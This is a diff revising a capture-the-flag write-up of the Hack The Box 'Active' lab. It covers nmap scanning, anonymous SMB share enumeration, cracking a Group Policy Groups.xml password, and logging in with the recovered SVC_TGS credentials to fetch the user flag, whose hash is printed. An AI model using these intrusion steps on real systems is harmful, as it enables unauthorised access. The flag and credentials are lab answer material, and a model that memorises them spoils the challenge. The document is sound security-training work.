@@ -9,15 +9,16 @@
 ### Vulnerabilities
 - The old Groups.xml file which contains encrypted (but easily crackable) usernames and passwords had never been cleaned/removed from the server SMB share.
 - Anonymous access to one of the SMB shares allowed for enumeration and privilege escalation. Anonymous access should be removed entirely.
-- An Administrator account was used as a service account, allowing for Kerberoasting and eventual password brute forcing of the password, separate low privilege service accounts should be used for this purpose.
+- An Administrator account was used as a service account, allowing for Kerberoasting and eventual password brute forcing of the password. Separate low privilege service accounts should be used for this purpose.
 - A weak password was used on the Administrator account.
 
 ### Strengths
-- The lack of readily available remote access services exposed to the network made movement a little more difficult.
+- The lack of readily available remote access services exposed to the network made exploitation more difficult.
 
 # Solving user.txt
-```
 I started off this box with the generic nmap scans.
+```
+└──╼sudo nmap -sS -oA allports -p- 10.10.10.100
 PORT      STATE SERVICE
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
@@ -44,7 +45,7 @@ PORT      STATE SERVICE
 49173/tcp open  unknown
 ```
 
-Noticing that SMB was available, I look to see if we could access the shares via a null session. Sure enough, we READ access to one share.
+Noticing that SMB was available, I looked to see if we could access the shares via a null session. Sure enough, we had READ access to one share.
 ```
 └──╼ $nxc smb 10.10.10.100 -u '' -p '' --shares
 SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
@@ -61,7 +62,7 @@ SMB         10.10.10.100    445    DC               SYSVOL                      
 SMB         10.10.10.100    445    DC               Users
 ```
 
-Noticing that DNS was also available, I also did a quick check there looking for entries and if I could zone transfer. This did not yield any results.
+Noticing that DNS was also available, I also did a quick check for entries and if I could zone transfer. This did not yield any results.
 ```
 └──╼ $dig any active.htb @10.10.10.100
 
@@ -119,7 +120,7 @@ SPIDER_PLUS 10.10.10.100    445    DC               [*] File size min:        22
 SPIDER_PLUS 10.10.10.100    445    DC               [*] File size max:        3.63 KB
 ```
 
-I then looked through the 10.10.10.100.json file for interesting files. The main file that caught my attention here was Groups.xml as I vaguely remembered that Microsoft had leaked a decryption key for credentials stored in this file long ago and generally no longer used.
+I then looked through the 10.10.10.100.json file for interesting files. The main file that caught my attention here was Groups.xml as I vaguely remembered that Microsoft had leaked a decryption key for credentials stored in this file long ago and generally no longer used this type of credentials storage.
 ```json
 └──╼ $cat 10.10.10.100.json
 {
@@ -203,7 +204,7 @@ GPPstillStandingStrong2k18
 
 This then gave me a set of valid credentials: `active.htb\SVC_TGS` and `GPPstillStandingStrong2k18`.
 
-I then enumerated the available SMB shares again with the new user credentials and found that we have more access. This time, we have READ access to 4 different shares.
+I then enumerated the available SMB shares again with the new user credentials and found that we had more access. This time, we had READ access to 4 different shares.
 ```
 └──╼ $netexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
 SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
@@ -245,7 +246,6 @@ getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec
 ```
 └──╼ $cat user.txt
 1637b113bc72da37ee0efcb7676c55eb
-
 ```
 
 # Solving root.txt
